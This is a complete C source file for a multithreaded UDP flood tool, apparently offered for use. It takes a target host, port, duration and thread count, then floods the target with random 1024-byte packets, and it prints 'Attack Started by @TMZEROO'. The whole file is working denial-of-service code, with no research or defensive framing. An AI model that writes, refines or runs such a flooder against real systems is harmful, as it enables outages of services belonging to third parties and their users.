#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <poll.h>

typedef struct {
    const char* ip;
    int port;
    int duration;
} udp_args;

// Generate a random payload
void generate_random_payload(char* buffer, int size) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < size - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size - 1] = '\0';
}

// UDP flood function using poll() for non-blocking I/O
void* udp_flood(void* arg) {
    udp_args* args = (udp_args*)arg;
    int sock;
    struct sockaddr_in target_addr;
    char packet[1024];

    // Resolve IP address or hostname
    struct hostent* host = gethostbyname(args->ip);
    if (!host) {
        fprintf(stderr, "Error: Unable to resolve hostname %s\n", args->ip);
        pthread_exit(NULL);
    }

    // Configure the target address
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    memcpy(&target_addr.sin_addr, host->h_addr, host->h_length);

    // Open a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set up polling structure
    struct pollfd pfd = {sock, POLLOUT, 0};

    // Initialize random seed and calculate end time
    srand(time(NULL));
    time_t end_time = time(NULL) + args->duration;

    // Start sending packets
    while (time(NULL) < end_time) {
        generate_random_payload(packet, sizeof(packet));

        // Wait until the socket is ready for writing
        if (poll(&pfd, 1, 100) > 0 && (pfd.revents & POLLOUT)) {
            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP/Hostname> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }

    printf("Attack Started by @TMZEROO\n");

    const char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t thread_pool[threads];
    udp_args args = {ip, port, duration};

    // Create threads
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args) != 0) {
            perror("Thread creation failed");
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}
